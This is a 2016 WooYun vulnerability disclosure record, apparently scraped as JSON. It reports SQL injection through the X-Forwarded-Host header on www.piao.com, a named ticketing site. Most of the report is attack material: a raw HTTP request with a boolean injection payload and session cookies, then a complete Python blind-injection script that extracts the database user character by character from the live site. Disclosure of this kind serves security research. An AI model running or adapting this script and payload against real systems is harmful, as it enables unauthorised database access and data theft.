{"id": 86910, "wybug_id": "wooyun-2016-0192184", "wybug_title": "中国票务网某站X-Forwarded-Host存在sql注入漏洞（附脚本）", "wybug_corp": "中国票务网", "wybug_author": "路人甲", "wybug_date": "2016-04-05 16:32", "wybug_open_date": "2016-05-20 16:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-05：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-05-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中国票务网某站X-Forwarded-Host存在sql注入漏洞（附脚本） 详细说明：  \nGET /brand/103/index.php HTTP/1.1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21X-Forwarded-Host: -1' OR length(user())=22 AND 1=1 or 'a'='X-Requested-With: XMLHttpRequestReferer: http://www.piao.com/Cookie: ECM_ID=d4322e71dbadc27347d2ce025130a47d9f9186a1; PHPSESSID=731fcc89be2378cfdb68fc0bf7a1d5ac; goodsBrowseHistory=443%2C25428%2C26324%2C26009%2C25746%2C10498%2C26342%2C23812%2C650; Hm_lvt_6f15116a8ae9d01417d35b14cb52b23d=1459543143,1459543190,1459543263,1459543817; Hm_lpvt_6f15116a8ae9d01417d35b14cb52b23d=1459544040; HMACCOUNT=1604FF7B272EFB08; BAIDUID=192B4742FF6E154ABFD6EFB4958A33D9:FG=1; mTjx_2132_cityId=zunyi; mTjx_2132_cityName=%E9%81%B5%E4%B9%89Host: www.piao.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */*\n为真：\n\n为假：\n\nuser长度为22：\n\n\n\n   漏洞证明：  \n#encoding=utf-8import httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_uppercase)payloads += list(string.ascii_lowercase)for i in range(0,10):     payloads.append(str(i))payloads += ['@','_', '.', '-', '\\\\', ' ']print 'Try to retrive user:'user = ''for i in range(1,23):    for payload in payloads:                               conn = httplib.HTTPConnection('www.piao.com', timeout=30)                      headers['X-Forwarded-Host']=\"-1' OR ascii(substring(user(),%s,1))=%s AND 1=1 or 'a'='\" % (i, ord(payload))                        conn.request(method='GET', url= '/brand/103/index.php' ,                         headers = headers)            html_doc = conn.getresponse().read().decode('utf-8')            conn.close()                        print '.',            if  html_doc.find('12')>0 :  # False              user+= payload              print '\\nIn progress]', user              break        print '\\n[Done] User is:', user\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：10 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n     2016-04-05 12:26 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:22        | 当我又回首一切,这个世界会好吗?)\t\t \n  靠谱    \n     2016-04-05 16:34 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  漏洞厂商重新分配了下    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 10, "Ranks": null}